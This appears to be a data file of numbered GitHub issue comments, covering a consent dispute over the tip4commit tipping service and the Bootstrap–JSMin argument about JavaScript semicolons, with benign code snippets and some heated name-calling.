5954	"@rapilabs I am still in doubts. I feel that my arguments against it are left unnoticed. Just updated the https://github.com/tip4commit/tip4commit/wiki/FAQ , quoting from there:

> If somebody wants to reward independent contributors of random opensource project, does he or she needs a permission from project maintainers? Should project maintainers have the power over economic activities of other people?
"
5955	"@arsenische Not necessarily the project maintainers but when the project is a trademark then yes the trademark holder's permission might or might not be necessary depending on their trademark policy. And then raising money for certain individuals most certainly and absolutely requires their permission. You absolutely have no idea of the legal repercussions of what you are doing.
"
5956	"@rapilabs my apologies, I did not notice that was a recent addition. As for my association, I am just someone that likes the service, I have no direct ties to Tip4Commit outside of commenting here and donating on the site.

This is my profile on Tip4Commit:
https://coingiving.com/sponsors/174-blkswan
"
5957	"+1 on everyone pushing for this to be opt-in only. it is highly inappropriate to involve projects without explicit consent. 
"
5958	"@chx we are raising money to tip any individuals who contribute to the project, that's not about raising money to some particular individual. if contributor doesn't claim money, the'll be returned to the donation pool. what's wrong with that?
"
5959	"@arsenische Yes, so an individual contributor can sign up claiming/showing his contribution to different projects? Why isn't that feature there?

You are currently forcing all contributors in a project to get involved. Why can't you see that? 
"
5960	"> If somebody wants to reward independent contributors of random opensource project, does he or she needs a permission from project maintainers? Should project maintainers have the power over economic activities of other people?

This is not only about project maintainers. You don't have the consent of the individual contributors either. Make it an opt-in system and all concerns raised here will disappear.
"
5961	"After looking at Flattrs business model, i now think that tip4commit doesn't necessarily have to become opt-in. Flattr offers to collect money too -- the main difference between it and tip4commit is that Flattr doesn't actually withdraw money until the project maintainer actually claims it. Another difference is that Flattr doesn't send any unsolicited mails.
"
5962	"@arsenische: You're fighting a losing battle, here. The internet disagrees with your stance. That's not a good place to be for an internet-based service.

Please just bow to inevitability and respect for the open-source community by making it opt-in, as very nearly everyone in this thread wants you to. At the very, very least, you must provide an easy way to opt-out.
"
5963	"@arsenische If there's anything to take away from this experience, is that you should listen to the community.  Fighting against it raises suspicions that there are ulterior motives.
"
5964	"> Make it an opt-in system and all concerns raised here will disappear.

Much of the functionality of the service would also disappear.
"
5965	"@arsenische I have been following this discussion from the beginning (in HN too). I feel both sad and angry about the arguments you make towards the people who are disagreeing with you. The problem is, you **cannot** use a developer's name, or any trademark to get people to pay you, without the actual person's consent. Whether it goes to the payee or not, is irrelevant.
"
5966	"@BLKSwan then perhaps there's no need for it in this way and form...? See this https://github.com/tip4commit/tip4commit/issues/127#issuecomment-61370073 .
"
5967	"@BLKSwan then site should not exist, that simple.
"
5968	"@arsenische I will reiterate what I have asked for in #146. I am an individual developer making a request on behalf of my individual self. I do not want to receive ""tips"" from your ""service"". You do not have the right to attempt to list me/opt me in to your ""service"" without my consent. You do not have my consent. I do not want to receive emails about ""tips"" from your ""service"". I do not want you to collect money on my behalf.

I do not know how to state it more clearly than this. I want my individual personal name out of your listings, I never want it to appear there again, and I want to be permanently removed from your ""service"".

You are failing to display the good faith asked of you in #146.
"
5969	"1. If community is against the site, I am sure @alexandrz and me will come to a decision to kill it and make all we can to return unused funds or donate to charity.
2. If there are certain issues that can be fixed without breaking the system - we should fix them.
3. I personally think that tickets like #152 break the system, but if there is consensus on that - let's be it.

Edit: created #157 to address p.1

Edit2: replied to @ubernostrum 's #146 

Edit3: removed mitsuhiko/\* as requested
"
5970	"I think it is a good idea to create a separate issue for each problem you see and continue discussion on that particular issue. We went too far from ""Please remove mitsuhiko"" and @mitsuhiko closed this ticket already.
"
5971	"nope - that's a bug in jsmin. Probably should let @douglascrockford know about it though.  thanks! 

_edit_: The code had already been changed to an `if` when i suggested the jsmin issue be filed as a bug. Bootstrap and jsmin play very well together.
"
5972	"That is insanely stupid code. I am not going to dumb down JSMin for this case.
"
5973	"TC39 is considering the use of ! as an infix operator. This code will break in the future. Fix it now. Learn to use semicolons properly. ! is not intended to be a statement separator. ; is.
"
5974	"i have learned to use them, that's why there isn't one present.
"
5975	"> i have learned to use them, that's why there isn't one present.

_Zzzzing!_
"
5976	"Any language with syntax arguments is clearly broken, compilers deal with this.  Dart, I guess.
"
5977	"http://www.youtube.com/watch?v=rrPosTPSXxw
"
5978	"if you _really_ wanted to get rid of the semicolons (though I really don't see the point of that, is it really that bad that it's worth worrying about it?), `! ... &&` in this context an be replaced with `... ||`.
"
5979	"coffeescript ftw?

otherwise, if you're doing real javascript, do it right?

p.s. (I'm not a coffeescripter yet, but it looks more and more like the right tool every day)
"
5980	"> i have learned to use them, that's why there isn't one present.

Wow. I've read @fat's reasoning for not using semis, but when it comes to actual problems cropping up in the real world, why does ""aesthetic"" preference take precedence? Why write something like

``` javascript
!function( $ ){
...
}( jQuery )
```

just to avoid placing a semi a the end?

`!` is clearly not meant to do this job. It's a bool operator. Does the fact that the symbol looks prettier really matter?

I am well aware that you can hack your way around this and keep saying ""nuh uh!"" instead of admitting that it's ill conceived and improving, but seriously: making a snippy response like that just makes you look like an immature hipster smarting off to a battle worn professional. @douglascrockford is on the technical committee for fuck's sake.
"
5981	"This has nothing to do with being a hipster, and I have no idea why anyone seems to think it does. The simple fact is this code runs on ALL browsers without issue. Regardless if the fact that X version of javascript somewhere in the Y future will stop supporting it (maybe) does NOT give a reason for a javascript minifier to NOT correctly minify it.

Also if Crockford thinks this is insanely stupid code and he is on the technical committee then why is this insanely stupid code even possible?
"
5982	"I know who @douglascrockford is but who is this @fat fellow?
"
5983	"> Also if Crockford thinks this is insanely stupid code and he is on the technical committee then why is this insanely stupid code even possible?

Being on the technical committee in 2012 for a language initially created 16 years ago probably doesn't grant him authority to radically change things like that.
"
5984	"@zacstewart Jacob wasn't trying to snippy, he was responding directly to one person's aggressive remarks. Taken out of context I can understand how it might look that way, but side-by-side, there's no issue there.

All Jacob pointed out was that this is a bug in someone else's code and that guy comes in guns blazing instead of speaking calmly and objectively? I call bullshit on the whole situation. If semicolons aren't required, then we don't need to include them. It's as simple as that.
"
5985	"> The simple fact is this code runs on ALL browsers without issue. Regardless if the fact that X version of javascript somewhere in the Y future will stop supporting it (maybe) does NOT give a reason for a javascript minifier to NOT correctly minify it.

Forcing unwanted paradigms has no business in code reviews.

Tools that reformat code can break code if the code is dependent on whitespace. Javascript is dependent on whitespace due to semicolon insertion. Javascript minification is not part of the language. So the code is correct for the author and they should not use a tool that breaks it. 

I agree that the code runs and my first statement speaks to the freedom of an author to do as they wish. The freedom to code as they see fit. Those are compelling reason to NOT change it. However, the reality is that very few individuals will use the code unminified and the question of ""correctness"" falls to common convention as a matter of pragmatism. The middleground is to add a semicolon for general use of the code. Branch it and have a nice bootstrap-dropdown-minification_safe.js - There's nothing wrong with changing the code as you see fit to meet your needs.

Do not demand to change a tool because you want to use the tool in a way another author has explicitly said they will not support. That's hypocrisy. That's why people are getting upset.
"
5986	"Learn to interop with existing toolset folks! This is a ridiculous debate.
"
5987	"Semicolons ARE the recommended practice... not just from Crockford, but also in Google's JS style guide: http://google-styleguide.googlecode.com/svn/trunk/javascriptguide.xml#Semicolons
"
5988	"@eligrey - line break or not, Javascript never ends a statement if the next token is an infix or bracket operator.    See http://google-styleguide.googlecode.com/svn/trunk/javascriptguide.xml#Semicolons for some possibly surprising examples. 

So if ! becomes an infix op, then newline + ! will no longer be equivalent to ; + !.  
"
5989	"> nope - that's a bug in IE. Probably should let @BillGates know about it though. thanks!

Do you agree with this?

While I agree that JSMin can be improved for this case, but you also :)
"
5990	"If anyone is curious about the ~~TC39~~ proposed syntax for the ! infix operator, [here it is](http://wiki.ecmascript.org/doku.php?id=strawman:concurrency)
"
5991	"Disagree with Mr. @fat approach: you distribute the code to developers and don't want to listen to good practices that are advised. I would have refactored the code when I had faced complaints from the users.
"
5992	"Thanks to the stand-off on this issue, I have to maintain my own branch of Bootstrap with semicolons inserted so that it minifies gracefully. Keeping my repo in sync is not fun at all, so I'm deploying out-of-date versions with my apps.

Given how much pain making production use of Bootstrap was, it felt like a version 0.2, not 2.0.
"
5993	"Clearly JSMIn isn't changing. That means Bootstrap can either add semicolons, or have people run into this issue again with JSMin. That's stupid, just use semi-colons. 

Also, being a hugely popular library, people who have never developed a thing in their life are probably going to learn from bootstrap code - and emulate it. Then this newbie is screwed. Some brave soul decides to get his idea into the real world, finds bootstrap as it's the best thing out there for making beautiful apps, seeks to modify things, and picks up bad habits. Embracing bad habits is a dis-service to the whole JS community.

That's not cool.

Newbies are going to use bootstrap. They are going to learn from bootstrap. 
"
5994	"Don't use JSMin with this project. Write documentation for newbies explaining why they shouldn't use JSMin.  Don't tell the maintainer he has to do x or y for his own project.  Fork it if you feel strongly enough to change the code.

@fat shouldn't change his code to work with JSMin and @douglascrockford shouldn't change his code so bootstrap can work with it.  Just document why it doesn't work and move on?
"
5995	"Agreed, if you're making a general purpose tool like Twitter Bootstrap, make it as compliant as possible and use good practices.

Don't be a JavaScript hipster.  Add semi-colons.

This is JavaScript.  Relying on implicit insertion of semi-colons is stupid.
"
5996	"This minifies just fine via Rails' asset precompiling - I've never ran into an issue with it. IMHO, this is my issue with JavaScript as a language being much too flexible and forgiving.
"
5997	"tl;dr: use Coffeescript if you don't want semicolons.

Semicolonless Javascript is an ego-stroking attempt at rejecting standards _for the sake of rejecting standards,_ not for the greater benefit of the community. While the need for hacks exists just to get around using semicolons, the practice does greater harm than good. ""Use semicolons at the end of a statement"" is a far simpler rule than ""never use semicolons, except sometimes you have to use _x_ hack, like prefixing with a **!**."" All this for the benefit of an opinionated aesthetic? I propose that one might as well use Coffeescript instead, if the intent is _prettier_ code by standards set as a lack of syntactic symbols. 

Or, just write clean, standard (as defined by not just the specification, but as defined by the developer community) Javascript, if it is to be shared, used, and contributed to by the greater community.
"
5998	"@douglascrockford: Regardless of whether you consider this usage of ASI a bug, it'd be ignorant not to acknowledge that there certainly _is_ a bug in JSMin.
"
5999	"At the end of the day, the repo maintainers can do whatever they please. We're not paying to use Bootstrap. They can include ASCII fingers all over the place if it makes them happy. If we don't like it, we can use something else or fork it. That said, I still think this discussion is valuable (minus the aggression), as these sorts of conversations get people thinking more deeply about code standards and how they fit into our everyday work as developers.
"
6000	"+@ajacksified +@shama 
"
6001	"Even though a semicolon might be 'better'. The syntax is correct, and jsmin should NEVER change or break working code.
Period. so either stop using jsmin, or start fixing jsmin.
"
6002	"@ChadMoran I believe he's talking about putting the ! in front of that code.
"
6003	"@ChadMoran I think the point is `function(){...}();` vs `!function(){...}()`
"
6004	"/\* Title: Immediate functions
Description: syntax that enables function execution as soon as it is defined
*/

(function () {
console.log('watch out!');
}());

//alternative with less parentheses
!function () {
console.log('watch out!');
}();

// reference
// http://www.jspatterns.com/
// http://shop.oreilly.com/product/9780596806767.do?sortby=publicationDate
"
6005	"The point of using C syntax is to have "";"" and ""{"" ""}"" to make sysntax and flow intend obvious to other programmers. This code is not obvious to other programmers (its not to me) so fix it by adding "";"" on the end of expressions. Thanks.
"
6006	"I don't think talking this much about a semicolon is worth it.

Does refusing to use a semicolon make the code go faster? NO
Does it make the code harder to read and understand? YES
Will it break in the future? Probably
Does it have the bigger potential for future bugs? YES

Semicolon insertion was a mistake in JavaScript, along with eval, with and function scoping. People should be avoiding these instead of abusing them.

Semicolons are better for readability: if I see a diff, I know exactly where the line ends.
"
6007	"I take it you really read ecmascript262 (and I assume you did because you use it as an excuse for the bad practice of omitting semicolons) then you should realize that JS grammar is ambiguous. It's particularly ambiguous where it's about what constitutes a statement if you omit a semicolon. Browsers implement heuristics when trying to parse it (a fancy word for guessing) and as a result don't always agree between each other. Because humans aren't very good at parsing a context-sensitive grammar and executing an approximate state-machine and if/else decision tree to figure out if something is a statement or not, we punny humans tend to do it wrong every once in a while, even if we're extremely well versed and hold the entire JS grammar in our heads (which would be a considerable feat).

Fortunately, there's a ""fix"" for this lamentable human condition. The fix is just to insert semicolons, even though technically it's not required in all cases. But I promise you, the time wasted writing out that semicolon is more than compensated by the time you will not spend hunting down heisenbugs due to browsers differing understanding of statements, the time not spent trying to make your JS code compatible to all JS-manglers (like JSmin, closure compiler etc.), the time not spent arguing in favor of an outdated and obviously bad practice with random people on the internet AND the time not spent fixing all your code when a browser implements a newer revision of JS.
"
6008	"Hello everyone,

I've forked JSMin and implemented the desired behavior:  https://github.com/shawnpresser/JSMin

It scans for ""newline [whitespace] exclamation"" and replaces the newline with a semicolon.

I hope this proves useful to someone (perhaps to the authors of Bootstrap).  It was a fun project.
"
6009	"@shawnpresser This means deploying your version of JSMin on all my systems, plus ensuring your version is in sync with upstream JSMin.

Why can't we instead just replace all `\n!` with `\n;!` in Bootstrap? It's easier and doesn't affect production environments.
"
6010	"Writing JavaScript without semicolons is like doing all of your HTML in quirks mode, with improper nesting, unclosed <li> tags, and unquoted attribute values.

Just as HTML was designed so that a webpage would still probably look ok even with a sloppy idiot writing markup in HotDog, JavaScript was designed so that people writing code in Notepad would still probably get something workable if they forgot a semicolon here and there.

Doesn't make it the ""right"" way to do it.
"
6011	"@shawnpresser that's wonderful, can you please implement it as well for the YUI compressor, googles closure compiler, dean edwards packer and microsoft ajax minifier?
"
6012	"Having experience using Bootstrap 1.4 on a large JS application, I can tell you that Bootstrap (1.4 at least) falls apart when uglified.
"
6013	"Any fool can write code that a computer can understand.  Good programmers write code that humans can understand.  ~Martin Fowler
"
6014	"Couldn't @douglascrockford's JSMin just output an explanatory fatal error in this case, for the reason outlined in the [third reply here](https://github.com/twitter/bootstrap/issues/3057#issuecomment-5135562)?
All programs that pass JSMin would still be syntactically intact. And JavaScript non-wizards (like me) would not sit there with broken code produced from two parts which we thought we could rely on.

(And a big thanks to unknown for deleting all the meme/boobs.gif crap replies!)
"
6015	"@pyalot I could try.
"
6016	"https://github.com/twitter/bootstrap/issues/401

""fat: The reason it was closed is because semicolons were added to the end of lines in 1.4. In 2.0 we removed them again when we introduced the downloader as it safely concats and minifies these files for you. I'm adding semicolons to the end of files in 2.0.1 - which will likely be released tomorrow, to support this mobile oddity.""
"
6017	"“Be liberal in what you accept, and conservative in what you send.”
"
6018	"@shawnpresser Your fork does not minify this example correctly:
if (confirm('Are you sure?') &&
    !false)
{
    alert('ok');
}
"
6019	"@lcdt fixed; thanks.
"
6020	"tl;dr Someone finds bug in JSMin, people that use Bootstrap (for free) make demands and lecture the authors about the one true way to write JavaScript.
"
6021	"+1 to @istvan-antal @ajacksified @pyalot 
Egos does not do any good to community. When you are a library developer, sometimes you have to go with the not so nice implementation to support as many users as possible. If you just don't want this, then, don't share your code, remove it from GitHub, and continue close-sourced. The main goal of open sourcing, sharing, GitHubbing... is being open to real facts. Javascript uses semicolons, everywhere. Its like the issue on leaving a comma at the end of an array definition in javascript. Its valid, but... IE breaks. So, just delete them.
(I can't imagine this people getting married <g>)
"
6022	"@madrobby TL;DR two tools are incompatible to each other with each author claiming what they do is the one true way. However one tool (JSmin) is deployed across the entire JS ecosystem at countless locations site authors have no influence whatsoever, and the other is ignoring sage advice from one of our elders, you decide!

P.S. we now also have a gazillion forks of JSmin and bootstrap, both of which are virtually useless for different reasons. If you fork JSmin you'd have to convince everybody in the foodchain to use the forked JSmin or you're still gettting screwed at places you have no choice about, and the bootstrap forks would have to keep up with the primary upstream (bootstrap) or they're quickly getting to a derelict unmaintained state.
"
6023	"What is with this new group of JS developers that refuse to use a semi colon? You're idiots. Use the semi colon like you're supposed to do.
"
6024	"The solution to a problem like this is very simple. Project maintainers need to consider who the target audience for their project is, and maintain their project in such a way as to properly set and meet the expectations of that target audience.

I would imagine that the target audience for Twitter Bootstrap generally:
- doesn't know the [rules of JavaScript ASI](http://es5.github.com/#x7.9.1)
- doesn't know how to choose the right tools
- doesn't understand how to debug errors in the tools they use
- needs all the help they can get

Which means that it might be a good idea to consider:
- adopting a coding style that does as much as possible to help keep them out of harm's way
- documenting things the project does that might not conform to their expectations
- making explicit recommendations on tools and processes

Ever since I started actually teaching JavaScript, I've learned a lot about how to help reluctant JavaScripters (read: the 99%) read and write code. Omitting all semicolons except where absolutely necessary for proper ASI definitely doesn't help them.

Also, when responding to a user issue like this one, consider the first list. The user doesn't know what tool they should be using. The user doesn't know what's really going on. They've most likely inherited some arcane stack of tools that they can't discard, and need all the help they can get.

(and passing the buck isn't really ""help"")
"
6025	"Looking for a technical solution (""just use semicolons everywhere"") is not going to help with a social problem (reluctance to properly learn JavaScript).
"
6026	"Also, regarding the setting of expectations, one of the most prominent headers on the [Twitter Bootstrap homepage](http://twitter.github.com/bootstrap/) is **Designed for everyone, everywhere.**

Just in case there was any confusion as to whom this project was designed for.
"
6027	"> documenting things the project does that might not conform to their expectations

Like mentioning in the INSTALL or README that th script MAY NOT be compatible with this or that minifier.

Would sound like a compromise solution to all three parties -- the Bootstarp,the JSmin and some developper.

But it isn't. Have to keep my own readme.txt for every library with notes upon their potential bad behavior then implementing into production.
"
6028	"@madrobby that's pure arrogance. What about people in the process of ""properly learning"" Javascript?
"
6029	"@madrobby funny you should say that because I always considered ""properly learning javascript"" to involve reading the spec, subsequently being horrified about the ambiguity in statement interpretation and henceforth using semicolons. Obviously there's a different level of comprehension, the one which doesn't read the entire ecmascript262 and stops at the paragraph about 1/4th down in the document that states semicolons are optional, but doesn't actually make it down to the grammar.
"
6030	"@madrobby Are you seriously implying that users of either JSMin or bootstrap shouldn't be making recommendations to the authors of said libraries? Come on now... that's how open source works. 

Crockford, while abrasive and aggressive, has pointed out that bootstrap has a high likelihood of breaking in the future with in standard JavaScript if they continue to use a specific ""style"". The point being that relying on ASI (a set of rules that change, at least according to TC39) is not as reliable and future-proof as just using semicolons. Presenting it as an argument about the ""one true way"" is spurious. Here we have someone who, for better or worse, is helping shape the future of JavaScript telling someone their code will break, and that advice being ignored. For what reason? So the code looks pretty? This isn't about the ""one true way""... this is about saying that using semicolons is a best practice, because it'll mean your code has a better chance of staying semantically correct in the future. 
"
6031	"+1 semicolons.
"
6032	"Apart from the semicolon issue, what's wrong with signifying your intent in your code rather than abusing the logical operators:

```
if(!isActive) {
    $parent.toggleClass('open');
}
```
"
6033	"It's a tough issue either way. If Crockford changes JSMin to accept this input, JSMin is helping devs write code that'll possibly break in standard JS in the future. If he doesn't, he'll be not accepting input that works in all flavors of JS right now. 
"
6034	"Reason to use semicolons - code will work properly and people will be able to get work done.

Reason not to use semicolons - aesthetics and ego.

Are you adults or children?
"
6035	"Entertaining thread :) You clearly have first world problems. Come on, it is just some extra characters which is also best practice. Not fixing a problem that you otherwise could in 2 seconds is not very smart move for whatever reason. 
"
6036	"For the folks out there using Django compressor, see this issue: https://github.com/jezdez/django_compressor/issues/237
"
6037	"+1 semicolons
"
6038	"You guys are all really angry lol...

It's simple, you want a semicolon there. Fork the repo and add it yourself and shut your mouth. Problem solved.

It's fat's choice, and let it be. Don't try and shove your ahole lectures on why semicolons are used in herpy derps javascript library therefore must be used in everyones.

There are plenty of forks that solve this problem, or you could just open notepad and add one at this spot.

Nobody has any right of demanding someone who does something for his free time to change anything (assuming Twitter doesn't sponsor this, which I don't think they do?). If you have a problem with it, that's why they invented open source... so you can download it and add myfacesmells_ to the beginning of every variable.
"
6039	"Semicolon insertion is a backup... a bonus.... relying on it is insanely stupid.
"
6040	"@dubcanada, Twitter does not sponsor it, as per Mark and Jacob's words in some other thread.
"
6041	"If you have pigeon shit on your shoulder and I dare to mention it to you then you can say that ""Hmm, I see it but it looks good there, I also know that pigeon, his name is Dave, now move on."" or you can just say ""Thanks dude, I didn't notice it"".

Btw you are right there should be a different branch called ""Twitter bootstrap (with semicolons)""
"
6042	"Here, I'll fix this thread:

s/insanely stupid/potentially incompatible and therefore not advised/g
s/dumb down JSMin/allow JSMin to accept input that goes against TC39 because it might break future compat/g
s/learn to use semicolons properly/please start using semicolons, as that will help ensure future compatability./g
"
6043	"Add the stupid semicolon already. The longer the delay, the more painful it will become.
"
6044	"Or just use UglifyJS? I don't recall it having problems with that issue.
"
6045	"It's not painful to fat. He doesn't give a crap... it's painful to the morons in this thread trying to force him to add it, rather then just adding it themselves when they download.

Also saying that some possible change in the future might break this is stupid. That's like saying you shouldn't use X function in php because it may be deprecated in 2020. Or you shouldn't use any HTML5 attribute because the spec is not done and it might change.
"
6046	"Regardless of whether semicolons are best practice or not, the fact jsmin is breaking existing, functional non-minified code is a flaw.
"
6047	"It also works with http://slimit.org/ I believe and http://slimit.org/ is actually smaller then jsmin.

Both are positives!

Or you could just not minify your javascript, in this day and age with the amount of bandwidth we all have. It really would not be a big deal.
"
6048	"@dubcanada , why so angry? I personally don't care if bootstrap adds the semicolon. I can easily add the semicolon myself. What I care about is other people having their stuff break because neither crockford nor fat are willing to budge here. 

The advice I gave about future compat might be a case of YAGNI, or it might not be. Only time will tell. But look at the possible outcomes:

Crockford adds support: 1. Accept input that may break in the future. 2. Accept more input that works right now. 3. Crockford acknowledges that while it's harder and potentially riskier to not use semicolons, it's still perfectly valid right now, and his tool should just be minifying, not enforcing a standard (that's what JSLint is for).

Fat adds semicolon: 1. Have your code be potentially more future-proof. 2. Make your code work with JSMin. 3. Bow to the practice that adding semicolons increases compatability with existing tools and is easier than not using semicolons. 

Neither budges: 1. Other forks must be constantly maintained to add semicolons to make it work with JSMin, or otherwise abandon JSMin as a reliable minifier. 

I personally think @fat should just add the semicolon given the options above. If you disagree, fine, but it doesn't make either of our arguments stupid. 
"
6049	"@dbounds I think you might want to try http://slimit.org/. I think it would successfully minify this, although I haven't tested myself.
"
6050	"""Or you could just not minify your javascript, in this day and age with the amount of bandwidth we all have. It really would not be a big deal."" @dubcanada 

Someone's clearly never heard of a mobile data plan, or lived in a country that doesn't happen to have one of the fastest pipes in the world.
"
6051	"@Pewpewarrows 

Even on fast connections, minifying is important. Of course, other things should also be done for maximum increase in speed - minify, concatenate, gzip.
"
6052	"@nallar Of course, I was just pointing out the obvious.
"
6053	"Whether or not one agrees with ASI, it _is_ in the current spec. Therefore, that JSMin does not support this line of code would make it non-compliant. Imagine if you used the same argument to try and get out of paying taxes? ""That rule is stupid and I don't follow it""?

Douglas Crockford, bless his soul, is known for not being overtly diplomatic. I don't think he should change JSMin because in my view that would be compromising ""Crockford"". However, that does make his product less universal -- and that's good. People should be using JSMin because Crockford wrote it, not because it's expected to work everywhere. The idea is that if JSMin doesn't work on a given codebase, it's probably because Crockford wouldn't approve of that codebase -- and if that's important to you, then you know what to do: avoid Bootstrap!

Then again, I have to wonder if this battle of integrity is worth losing potential Bootstrap users. Besides, it wouldn't be too hard to prefix punctuation on the beginning of newlines with `;` -- a technique often employed by proponents of ASI. Changing the code to `;!isActive` would satisfy concerns while having neither person sacrifice on their ideals. 

EDIT:  or just do what @jed below me says, which is smarter. I think the world would run a little smoother if we all felt, ASI and semicolon users alike, that punctuation on the beginning of a new line that doesn't have a semicolon in front of it is a code smell in javascript.
"
6054	"i'm 100% with @fat on the semicolons, but don't understand the benefit of writing the very fragile

``` javascript
!isActive && $parent.toggleClass('open')
```

when

``` javascript
isActive || $parent.toggleClass('open')
```

is shorter and

``` javascript
if (!isActive) $parent.toggleClass('open')
```

is clearer, and neither break as easily.
"
6055	"@fat shouldn't be adding a semicolon because it makes the codebase too big.
People keep complaining ""Boo hoo hoo, twitter is so bulky and laggy!"", and then they contradict themselves by requesting the codebase get larger with needless semicolons. smh, people these days....
"
6056	"@pokonski ehm, https://github.com/mishoo/UglifyJS/issues/126
"
6057	"@fat You opened this as open source. When you do that you should be respectful of the people who will be using your code. That means adding semi-colons so we can all pick whatever minifier we want. But hey, i guess being a dick about the code you released as open source works too.
"
6058	"@jed 

Object f has no method 'forEach'

``` javascript
var foo = 'asdf'
[1,2,3].forEach(function(value){console.log(value)})
```

undefined is not a function

``` javascript
var foo = function(){}

(function(){
})()
```

number is not a function

``` javascript
var foo = 1+2
('asdf' + 'blubb').toUpperCase()
```

will compress wrong

``` javascript
var foo = /asdf/
console.log('here');
```

``` javascript
var foo = function(){}
var bar = function(){}
```
"
6059	"Yes, @fat, if you give me a free sandwich, I DEMAND THAT YOU GIVE ME THE PROPER SERVING OF MAYONNAISE, as dictated in Proper Sandwich Specification JB-332. To withhold the proper serving of mayonnaise, as dictated by the sandwich community, clearly means that you are a dick, whereas I am a simple and humble masticator who's just trying to consume the sandwich that you handed me for free without any loss of mayonnaise taste that I desire. I shall toss your free sandwich aside until you give me the sandwich that I clearly deserve. After all, Douglas Crockford gave me a free sandwich, and it had exactly the right amount of mayonnaise and it creamed my mouth just right. The problem is obviously you, so hurry up and FIX MY FREE SANDWICH, and don't you dare ever try to hand me free food again without meeting these minimum sandwich specifications.
"
6060	"@jed +1. Also, @nkwiatek, you're right. I think you've just reversed my opinion. Also, David Herman, another TC39 member, has indicated that TC39 will not be breaking existing code. 

In this case, @douglascrockford should support this correct code, even if it's against his preference, or he shouldn't call it a JS Minifier, he should call it a ""Douglas Crockford Flavored JavaScript minifier"". 

But also, @fat should change the code in the way @jed suggested. A bit of compromise on both sides so we can move on already. 
"
6061	"@pyalot none of which appear in the offending snippet. let's stay on topic.
"
6062	"> ""...making a snippy response like that just makes you look like an immature hipster smarting off to a battle worn professional.""
> ""You're idiots. Use the semi colon like you're supposed to do.""
> ""Are you adults or children?""
> ""But hey, i guess being a dick about the code you released as open source works too.""

Really?

What's immature are the needless personal attacks against @fat over a _coding style_.
"
6063	"@kitcambridge Yep.
"
6064	"@kitcambridge No, he released it as open source. Being disrespectful to the developers using it and then other developer's tools because it doesn't work with _your_ code is wrong. It's not even about if he likes semi-colons or not or his coding style. It's open source. Be nice to the people who are using your code for god's sake.
"
6065	"[Bike shed.](http://david.heinemeierhansson.com/posts/44-rookies-in-the-bike-shed)
"
6066	"@nkwiatek 

As far as I can see, JSMin doesn't claim to follow the spec - it claims to work on what jslint says is ok. I _think_ http://slimit.org/ works on the spec, although I haven't tried it. I believe the reason JSMin doesn't is to make it smaller(and faster!).

@ryangrahamnc 

Can't tell if serious. If you are... a minifier gets rid of a newline character instead... and much more. Otherwise, carry on! :)
"
6067	"@matthewdl Telling developers who are legitimately trying to use your code that they just dont know how to use semi-colons and that everyone else needs to work around their coding style is wrong in the open source world. It's about working together not trying to boost your ego.
"
6068	"@matthewdl If you want to talk about ""sandwiches"" and how it relates, it'd be like giving away a free one (great!) and when they ask for a napkin you respond with ""well, _I_ know how not to spill it on myself, maybe _you_ should learn to not make a mess on yourself too."" 
"
6069	"@nallar

Just a minor correction on my previous comment - apparently https://github.com/mishoo/UglifyJS is good.
"
6070	"In his talk at at JSConf, @fat basically stated that he sometimes uses semicolons, and sometimes doesn't, and that he omits semicolons from Bootstrap in a deliberately enigmatic attempt to troll the community...

Mission accomplished!
"
6071	"I have to admit to being one lazy bastard, and also like languages that have gone past C syntax just a little bit.  Really, ;'s should just be for separating two statements on one line.  Design for the rule, not the exception.

It took me way to long to find out that coffee-script was popular partly because it tries to protect you from JS by removing ambiguities and avoiding The Bad/Ugly Parts.

Don't get me wrong, I am a huge fan of JSEverywhere: client, server, datacom (JSON).  I think async is the safest, easiest understood multiprocessing technique.  Fork/Join is just too hard for humans .. I watched Sun struggle through 3 years getting Solaris multi-threaded.  Nightmare.

Damn.  Now I gotta learn all the Ugly parts of coffee-script I suppose.
"
6072	"People coming from different programming background are trying to adapt or style JavaScript to the environment they are familiar with.  There's nothing wrong in that.  JavaScript already has some bad things, but it also has many good things as well.  
Let the language be as it is and adapt it to what is best suited without breaking things that are already present.  Love the language for the good and respect the quirkiness as this language has evolved from a toy language to one of the most used and talked about language in the world.

Respect the members who have been trying to put sanity to the language and come up with guidelines and tools to make it work and understandable across various segments.

Style and beauty comes later.  What matters is the language's consistency. So, if that means putting a semicolon, why can't that be? Again not for flaming this discussion.

It has taken ages to make people realize the good and bad parts of the JS language, so why not respect that and move ahead.

If opensource is about sharing, then its also about caring (caring for all the apps already running which has been developed years before some developers were born)..

Definitely one can fork and move ahead, but that's not the point of this discussion, I guess.

By the way.. I love bootstrap as being a non-designer it helps me quickly build beautiful websites :)
"
6073	"fwiw, this was patched in bootstrap way before i even encountered this issue - otherwise i wouldn't have closed it outright. 

Sorry for the confusion everyone.

You can see the code here in 2.0.3: https://github.com/twitter/bootstrap/blob/2.0.3-wip/js/bootstrap-dropdown.js#L63

I still maintain this is a bug in jsmin, but as others have pointed out - mark and I do our best to make bootstrap flexible with other great tools out there (like jsmin). This includes adding semicolons where necessary or changing minor stylistic things.

@englishextra 2.0.3 should work fine for you - and will be released while mark and i are in london (april 21-25). cheers!
"
6074	"@douglascrockford If TC-39 makes ! an infix operator, which causes \n to not terminate the statement, then that will be a syntax change that is incompatible with current code in the wild, which would be an insanely stupid move on their part.

The fact of the matter is that JSMin isn't parsing JavaScript correctly.  I thought the separation of concerns was that JSLint tells you about stupid code, and JSMin correctly parses JavaScript according to the ES standard and minifies it safely.
"
6075	"Wow, @fat is such a brogrammer
"
6076	"meow
"
6077	"> The fact of the matter is that JSMin isn't parsing JavaScript correctly. I thought the separation of concerns was that JSLint tells you about stupid code, and JSMin correctly parses JavaScript according to the ES standard and minifies it safely.

Whatever gave you the idea that either of those tools actually parse JavaScript? UglisfyJS does for minifying. Esprima does in general, as do others. @douglascrockford created wonderful tools back before many others even thought to, but JSMin has been superseded by many alternatives, that I'm frankly surprised that it is used anymore.
"
6078	"@fat - Kudos for making the change. Agree or disagree with semi colons ( FWIW I agree) , it's nothing but positive when JavaScript code libraries work together. There are too many out there that don't integrate. I love bootstrap and an thrilled to see this change. Thanks.
"
6079	"> In his talk at at JSConf, @fat basically stated that he sometimes uses semicolons, and sometimes doesn't, and that he omits semicolons from Bootstrap in a deliberately enigmatic attempt to troll the community...

I suspectedthat from the start -- that's what it was.

> @englishextra 2.0.3 should work fine for you - and will be released while mark and i are in london (april 21-25). cheers!

HAHAHA

Thanks, gents
"
6080	"Fixed in jsmin? 
https://github.com/douglascrockford/JSMin/commit/5ca277ea452beae1c25db3bc0ef5c81309a3daf4#jsmin.c
"
